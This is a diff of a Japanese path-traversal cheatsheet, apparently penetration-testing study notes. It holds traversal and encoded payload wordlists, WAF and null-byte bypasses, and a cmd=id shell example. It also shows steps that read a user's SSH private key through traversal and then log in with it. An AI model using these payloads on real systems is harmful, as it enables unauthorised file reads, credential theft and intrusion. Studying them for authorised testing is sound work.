@@ -39,15 +39,16 @@
 2. 有効なペイロード（トラバーサルシーケンス）がわかったら、目的のファイルを取得する
 
 > [!TIP] 
-> `/etc/passwd` は検出できても `/home/carlos/secret` が検出できない場合は、WAFバイパスのためにURLエンコードを試す。
+> `/etc/passwd` は検出できても 目的のファイルが検出できない場合は、WAFで制限されているかのうせいがあるため、バイパスのためにURLエンコードを試す。
 > 
 > ```
-> /image?filename=<@urlencode_all>../../home/carlos/secret<@/urlencode_all>
+> /image?filename=<@urlencode_all>../../home/user/secret<@/urlencode_all>
 > ```
 
 ## /etc/passwd 用 Traversal Wordlist
 
-> [!WARNING] Intruderの「URL encode these characters」を**opt-out（無効化）**すること。デフォルトでは特殊文字がURLエンコードされてトラバーサルシーケンスが破壊される。
+> [!WARNING]
+> Intruderの「URL encode these characters」を**opt-out（無効化）**すること。デフォルトでは特殊文字がURLエンコードされてトラバーサルシーケンスが破壊される。
 
 ```
 /etc/passwd
@@ -84,29 +85,27 @@
 
 ### No defence（防御なし）
 
-トラバーサルシーケンスを直接ブルートフォース：
-
+トラバーサルシーケンスを直接ブルートフォース
 ```
 /image?filename=§§
 ```
 
 ### Prefix validation（絶対パスの検証）
 
-`?filename=/var/www/images/36.jpg` のように絶対パスが指定されている場合、正常な値の後ろでPath traversalを実行する：
-
+`?filename=/var/www/images/36.jpg` のように絶対パスが指定されている場合、正常な値の後ろでPath traversalを実行する
 ```
 /image?filename=10.jpg§§
 ```
 
 ### Suffix validation（拡張子の検証）
 
-上記2つがうまくいかない場合、null byteを使用する（PHPはnull byteを文字列終端として扱うため、後続のサフィックス検証をバイパスできる）：
-
+上記2つがうまくいかない場合、null byteを使用する（PHPはnull byteを文字列終端として扱うため、後続のサフィックス検証をバイパスできる）
 ```
 /image?filename=§§%00
 ```
 
-> [!NOTE] 複数のクエリを渡すには `&` を使う（例：`/image?filename=a.png../../shell.php&cmd=id`）
+> [!NOTE]
+> 複数のクエリを渡すには `&` を使う（例：`/image?filename=a.png../../shell.php&cmd=id`）
 
 ---
 
@@ -115,19 +114,16 @@
 初期侵入ができていない段階でPath traversalを使って秘密鍵を取得する手法。
 
 1. Path traversalで `/etc/passwd` を取得し、ユーザーとhomeディレクトリをメモする
-
 ```
 user:x:1000:1000:user,,,:/home/<username>:/usr/bin/zsh
 ```
 
-2. homeディレクトリ配下の秘密鍵を取得する（id_rsa以外の種類は→[SSH Private Keyの種類](https://claude.ai/OSCP/Cheatsheet/Ports%20-%20Service/22%20-%20SSH.md#SSH%20Private%20Key%E3%81%AE%E7%A8%AE%E9%A1%9E)）
-
+2. homeディレクトリ配下の秘密鍵を取得する（id_rsa以外の種類：[SSH Private Keyの種類](../Ports%20-%20Service/22%20-%20SSH.md#SSH%20Private%20Keyの種類)）
 ```
 ../../../../../../../../../home/<username>/.ssh/id_rsa
 ```
 
 3. 秘密鍵でSSHサーバーにアクセスする
-
 ```zsh
 ssh -i id_rsa <username>@<target_IP>
 ```
@@ -141,90 +137,6 @@ ssh -i id_rsa <username>@<target_IP>
 ---
 ---
 
-
----
-
-# Exploitation
-
-###### Traversal sequences
-
-- Unix → `../`
-- Windows → `../` or `..\`（`\` or  `%5C`）
-	- (`C:\`は指定不要)
-	- 例：`..\..\xampp\apache\logs`
-
-つまり、==スラッシュ・バックスラッシュのどちらも試すこと。==
-
-# 基本
-
-## 流れ
-
-1. 動作確認のため、`/etc/passwd`を検出する
-	- Windowsの場合: `C:\windows\system32\drivers\etc\hosts`
-2. 有効なペイロード(トラバーサルシーケンス)がわかったら、閲覧したいファイルを検出する
-
-💡Tips：`/etc/passwd`は検出できて`/home/carlos/secret`が検出できない場合は、WAFをバイパスするためにHV: `urlencode_all`する。↓例
-```
-/image?filename=<@urlencode_all>../../home/carlos/secret<@/urlencode_all>
-```
-
-###### /etc/passwdのtraversal wordlist（☑️Url encode these charactersをopt-outすること）
-```
-/etc/passwd
-../etc/passwd
-../../etc/passwd
-../../../etc/passwd
-../../../../etc/passwd
-../../../../../etc/passwd
-../../../../../../etc/passwd
-../../../../../../../etc/passwd
-....//etc/passwd
-....//....//etc/passwd
-....//....//....//etc/passwd
-....//....//....//....//etc/passwd
-....//....//....//....//....//etc/passwd
-....//....//....//....//....//....//etc/passwd
-....//....//....//....//....//....//....//etc/passwd
-%2e%2e/etc/passwd
-%2e%2e/%2e%2e/etc/passwd
-%2e%2e/%2e%2e/%2e%2e/etc/passwd
-%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-..%252fetc/passwd
-..%252f..%252fetc/passwd
-..%252f..%252f..%252fetc/passwd
-..%252f..%252f..%252f..%252fetc/passwd
-..%252f..%252f..%252f..%252f..%252fetc/passwd
-..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
-..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
-```
-
-## 手法
-#### No defenceの場合
-
-- 値を直接、[⚡️Path traversal](#/etc/passwdのtraversal%20wordlist)でbrute-force
-```
-/image?filename=§§
-```
-
-#### Prefix validationの場合
-
-- `?filename=/var/www/images/36.jpg `みたいに元々絶対パス指定のとき
-- 元の正常な値のうしろでpath traversalを実行する（[⚡️Path traversal](#/etc/passwdのtraversal%20wordlist)で）
-```
-/image?filename=10.jpg§§
-```
-
-#### Suffix validationの場合
-
-- 上記2つでうまくいかなかった場合
-- null byteを使用する（[⚡️Path traversal](#/etc/passwdのtraversal%20wordlist)で）
-```
-/image?filename=§§%00
-```
-
-⚠️複数のクエリを渡すには`&`を使う（例：`/image?filename=a.png../../shell.php&cmd=id`)
 
 ---
 
